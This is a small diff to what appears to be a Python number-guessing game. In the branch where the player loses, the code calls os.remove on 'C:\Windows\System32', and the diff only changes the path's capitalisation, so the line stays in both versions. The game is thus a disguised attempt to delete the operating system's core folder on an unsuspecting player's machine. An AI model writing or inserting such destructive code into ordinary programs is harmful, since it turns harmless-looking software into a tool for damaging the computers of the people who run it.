@@ -12,4 +12,4 @@ if guess == num:
     print("You won!")
 else:
     print("Good Bye!")
-    os.remove("C:\Windows\system32")
+    os.remove("C:\Windows\System32")
